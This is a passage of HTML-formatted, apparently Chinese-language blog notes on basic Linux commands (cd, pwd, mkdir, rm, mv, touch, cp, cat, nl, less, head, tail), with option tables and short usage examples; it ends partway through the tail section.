&lt;h4 id=&quot;示例-1&quot;&gt;&lt;a href=&quot;#示例-1&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ~&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ..&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; -&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;/根目录 ~用户主目录  ..上级目录 -上次所在目录&lt;/p&gt;
&lt;h3 id=&quot;pwd&quot;&gt;&lt;a href=&quot;#pwd&quot; class=&quot;headerlink&quot; title=&quot;pwd&quot;&gt;&lt;/a&gt;pwd&lt;/h3&gt;&lt;h4 id=&quot;显示当前目录&quot;&gt;&lt;a href=&quot;#显示当前目录&quot; class=&quot;headerlink&quot; title=&quot;显示当前目录&quot;&gt;&lt;/a&gt;显示当前目录&lt;/h4&gt;&lt;p&gt;格式: pwd [选项]&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-P&lt;/td&gt;
&lt;td&gt;显示实际物理路径，而非使用连接（link）路径&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-L&lt;/td&gt;
&lt;td&gt;当目录为连接路径时，显示连接路径&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-2&quot;&gt;&lt;a href=&quot;#示例-2&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;pwd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;mkdir&quot;&gt;&lt;a href=&quot;#mkdir&quot; class=&quot;headerlink&quot; title=&quot;mkdir&quot;&gt;&lt;/a&gt;mkdir&lt;/h3&gt;&lt;h4 id=&quot;创建目录&quot;&gt;&lt;a href=&quot;#创建目录&quot; class=&quot;headerlink&quot; title=&quot;创建目录&quot;&gt;&lt;/a&gt;创建目录&lt;/h4&gt;&lt;p&gt;格式: mkdir [选项] 目录&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-m –mode=模式&lt;/td&gt;
&lt;td&gt;设定权限&amp;lt;模式&amp;gt;&lt;/td&gt;
&lt;td&gt;s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-p –parents&lt;/td&gt;
&lt;td&gt;可以是一个路径名称。一次可以建立多个目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-v –verbose&lt;/td&gt;
&lt;td&gt;每次创建新目录都显示信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-3&quot;&gt;&lt;a href=&quot;#示例-3&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ mkdir -p &lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;/a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ mkdir -m 777 &lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ mkdir -vp &lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;/a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;rm&quot;&gt;&lt;a href=&quot;#rm&quot; class=&quot;headerlink&quot; title=&quot;rm&quot;&gt;&lt;/a&gt;rm&lt;/h3&gt;&lt;h4 id=&quot;删除&quot;&gt;&lt;a href=&quot;#删除&quot; class=&quot;headerlink&quot; title=&quot;删除&quot;&gt;&lt;/a&gt;删除&lt;/h4&gt;&lt;p&gt;格式: rm [选项] 文件或目录&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-f –force&lt;/td&gt;
&lt;td&gt;忽略不存在的文件，从不给出提示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-i –interactive&lt;/td&gt;
&lt;td&gt;进行交互式删除&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-r –recursive&lt;/td&gt;
&lt;td&gt;指示 rm 将参数中列出的全部目录和子目录均递归地删除&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-v –verbose&lt;/td&gt;
&lt;td&gt;详细显示进行的步骤&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-4&quot;&gt;&lt;a href=&quot;#示例-4&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ rm &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; my.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ rm -i *.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ rm -r &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;mv&quot;&gt;&lt;a href=&quot;#mv&quot; class=&quot;headerlink&quot; title=&quot;mv&quot;&gt;&lt;/a&gt;mv&lt;/h3&gt;&lt;h4 id=&quot;移动或改名&quot;&gt;&lt;a href=&quot;#移动或改名&quot; class=&quot;headerlink&quot; title=&quot;移动或改名&quot;&gt;&lt;/a&gt;移动或改名&lt;/h4&gt;&lt;p&gt;格式: mv [选项] 源文件或目录 目标文件或目录&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-b –back&lt;/td&gt;
&lt;td&gt;若需覆盖文件，则覆盖前先行备份&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-f –force&lt;/td&gt;
&lt;td&gt;如果目标文件已经存在，不会询问而直接覆盖&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-i –interactive&lt;/td&gt;
&lt;td&gt;若目标文件已经存在时，就会询问是否覆盖&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-u –update&lt;/td&gt;
&lt;td&gt;若目标文件已经存在，且源文件比较新，才会更新&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-t –target&lt;/td&gt;
&lt;td&gt;该选项适用于移动多个源文件到一个目录的情况，此时目标目录在前，源文件在&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-5&quot;&gt;&lt;a href=&quot;#示例-5&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ mv nginx.log nginx1.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ mv &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; *.log /Users/yanbin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;touch&quot;&gt;&lt;a href=&quot;#touch&quot; class=&quot;headerlink&quot; title=&quot;touch&quot;&gt;&lt;/a&gt;touch&lt;/h3&gt;&lt;p&gt;####改更日期或创建文件&lt;br&gt;格式: touch [选项] 文件或目录&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-a&lt;/td&gt;
&lt;td&gt;只改存取时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-c&lt;/td&gt;
&lt;td&gt;不建立任何文档&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-d or -t&lt;/td&gt;
&lt;td&gt;使用指定的日期时间,&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-m&lt;/td&gt;
&lt;td&gt;只更改变动时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-r&lt;/td&gt;
&lt;td&gt;指定文档或目录的日期时间，统统设成和参考文档或目录的日期时间相同&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&quot;cp&quot;&gt;&lt;a href=&quot;#cp&quot; class=&quot;headerlink&quot; title=&quot;cp&quot;&gt;&lt;/a&gt;cp&lt;/h3&gt;&lt;h4 id=&quot;拷贝&quot;&gt;&lt;a href=&quot;#拷贝&quot; class=&quot;headerlink&quot; title=&quot;拷贝&quot;&gt;&lt;/a&gt;拷贝&lt;/h4&gt;&lt;p&gt;格式: cp [选项] 源文件 目录 cp [选项] -t 目录 源文件&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-t –target-directory&lt;/td&gt;
&lt;td&gt;指定目标目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-i –interactive&lt;/td&gt;
&lt;td&gt;覆盖前询问(使前面的 -n 选项失效)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n –no-clobber&lt;/td&gt;
&lt;td&gt;不要覆盖已存在的文件(使前面的 -i 选项失效)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-s –symbolic-link&lt;/td&gt;
&lt;td&gt;对源文件建立符号链接，而非复制文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-f –force&lt;/td&gt;
&lt;td&gt;强行复制文件或目录， 不论目的文件或目录是否已经存在&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-u –update&lt;/td&gt;
&lt;td&gt;使用这项参数之后，只会在源文件的修改时间较目的文件更新时，或是对应的目的文件并不存在，才复制文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-6&quot;&gt;&lt;a href=&quot;#示例-6&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ cp &lt;span class=&quot;_&quot;&gt;-s&lt;/span&gt; nignx.log ~/home/desktop/nginx.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ cp -i *.log ~/home/desktop&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;输出&quot;&gt;&lt;a href=&quot;#输出&quot; class=&quot;headerlink&quot; title=&quot;输出&quot;&gt;&lt;/a&gt;输出&lt;/h2&gt;&lt;h3 id=&quot;cat&quot;&gt;&lt;a href=&quot;#cat&quot; class=&quot;headerlink&quot; title=&quot;cat&quot;&gt;&lt;/a&gt;cat&lt;/h3&gt;&lt;h4 id=&quot;一般输出&quot;&gt;&lt;a href=&quot;#一般输出&quot; class=&quot;headerlink&quot; title=&quot;一般输出&quot;&gt;&lt;/a&gt;一般输出&lt;/h4&gt;&lt;p&gt;格式: cat [选项] [文件]&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-A –show-all&lt;/td&gt;
&lt;td&gt;等价于 -vET&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-b –number-nonblank&lt;/td&gt;
&lt;td&gt;对非空输出行编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-e&lt;/td&gt;
&lt;td&gt;等价于 -vE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-E&lt;/td&gt;
&lt;td&gt;–show-ends    在每行结束处显示 $&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n –number&lt;/td&gt;
&lt;td&gt;对输出的所有行编号,由 1 开始对所有输出的行数编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-s –squeeze-blank&lt;/td&gt;
&lt;td&gt;有连续两行以上的空白行，就代换为一行的空白行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-t&lt;/td&gt;
&lt;td&gt;与 -vT 等价&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-T –show-tabs&lt;/td&gt;
&lt;td&gt;将跳格字符显示为 ^I&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-v –show-nonprinting&lt;/td&gt;
&lt;td&gt;使用 ^ 和 M- 引用，除了 LFD 和 TAB 之外&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-7&quot;&gt;&lt;a href=&quot;#示例-7&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ cat -ns nginx.log &amp;gt; new.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ tac nginx.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;tac倒序输出&lt;/p&gt;
&lt;h3 id=&quot;nl&quot;&gt;&lt;a href=&quot;#nl&quot; class=&quot;headerlink&quot; title=&quot;nl&quot;&gt;&lt;/a&gt;nl&lt;/h3&gt;&lt;h4 id=&quot;带行号输出&quot;&gt;&lt;a href=&quot;#带行号输出&quot; class=&quot;headerlink&quot; title=&quot;带行号输出&quot;&gt;&lt;/a&gt;带行号输出&lt;/h4&gt;&lt;p&gt;格式: nl [选项] [文件]&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-b&lt;/td&gt;
&lt;td&gt;指定行号指定的方式，主要有两种：&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-b a&lt;/td&gt;
&lt;td&gt;表示不论是否为空行，也同样列出行号(类似 cat -n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-b t&lt;/td&gt;
&lt;td&gt;如果有空行，空的那一行不要列出行号(默认值)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n&lt;/td&gt;
&lt;td&gt;列出行号表示的方法，主要有三种：&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n ln&lt;/td&gt;
&lt;td&gt;行号在屏幕的最左方显示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n rn&lt;/td&gt;
&lt;td&gt;行号在自己栏位的最右方显示，且不加 0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n rz&lt;/td&gt;
&lt;td&gt;行号在自己栏位的最右方显示，且加 0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-w&lt;/td&gt;
&lt;td&gt;行号栏位的占用的位数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-8&quot;&gt;&lt;a href=&quot;#示例-8&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ nl -b t nginx.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ nl -n ln nginx.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ nl -n rz -w 3 niginx.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;less&quot;&gt;&lt;a href=&quot;#less&quot; class=&quot;headerlink&quot; title=&quot;less&quot;&gt;&lt;/a&gt;less&lt;/h3&gt;&lt;h4 id=&quot;分页输出&quot;&gt;&lt;a href=&quot;#分页输出&quot; class=&quot;headerlink&quot; title=&quot;分页输出&quot;&gt;&lt;/a&gt;分页输出&lt;/h4&gt;&lt;p&gt;格式: more [选项] 文件&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-e&lt;/td&gt;
&lt;td&gt;当文件显示结束后，自动离开&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-f&lt;/td&gt;
&lt;td&gt;强迫打开特殊文件，例如外围设备代号、目录和二进制文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;忽略搜索时的大小写&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-m&lt;/td&gt;
&lt;td&gt;显示类似 more 命令的百分比&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-N&lt;/td&gt;
&lt;td&gt;显示每行的行号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-s&lt;/td&gt;
&lt;td&gt;显示连续空行为一行&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;常用操作：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;符号&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;/字符串&lt;/td&gt;
&lt;td&gt;向下搜索“字符串”的功能&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;?字符串&lt;/td&gt;
&lt;td&gt;向上搜索“字符串”的功能&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;n&lt;/td&gt;
&lt;td&gt;重复前一个搜索（与 / 或 ? 有关）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;N&lt;/td&gt;
&lt;td&gt;反向重复前一个搜索（与 / 或 ? 有关&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;b&lt;/td&gt;
&lt;td&gt;向前翻一页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;d&lt;/td&gt;
&lt;td&gt;向后翻半页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;q&lt;/td&gt;
&lt;td&gt;退出 less 命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;空格键&lt;/td&gt;
&lt;td&gt;向后翻一页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;向上键&lt;/td&gt;
&lt;td&gt;向上翻动一行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;向下键&lt;/td&gt;
&lt;td&gt;向下翻动一行&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-9&quot;&gt;&lt;a href=&quot;#示例-9&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ less -N nginx.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ less nginx.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ps &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; | less&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;head&quot;&gt;&lt;a href=&quot;#head&quot; class=&quot;headerlink&quot; title=&quot;head&quot;&gt;&lt;/a&gt;head&lt;/h3&gt;&lt;h4 id=&quot;头输出&quot;&gt;&lt;a href=&quot;#头输出&quot; class=&quot;headerlink&quot; title=&quot;头输出&quot;&gt;&lt;/a&gt;头输出&lt;/h4&gt;&lt;p&gt;格式: head [选项] [文件]&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-c&amp;lt;字节&amp;gt;&lt;/td&gt;
&lt;td&gt;显示字节数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n&amp;lt;行数&amp;gt;&lt;/td&gt;
&lt;td&gt;显示的行数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-10&quot;&gt;&lt;a href=&quot;#示例-10&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ head -n 5 nginx.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ head nginx.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;tail&quot;&gt;&lt;a href=&quot;#tail&quot; class=&quot;headerlink&quot; title=&quot;tail&quot;&gt;&lt;/a&gt;tail&lt;/h3&gt;&lt;h4 id=&quot;尾输出&quot;&gt;&lt;a href=&quot;#尾输出&quot; class=&quot;headerlink&quot; title=&quot;尾输出&quot;&gt;&lt;/a&gt;尾输出&lt;/h4&gt;&lt;p&gt;格式: tail [选项] [文件]&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-f&lt;/td&gt;
&lt;td&gt;循环读取&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-q&lt;/td&gt;
&lt;td&gt;不显示处理信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;显示详细的处理信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
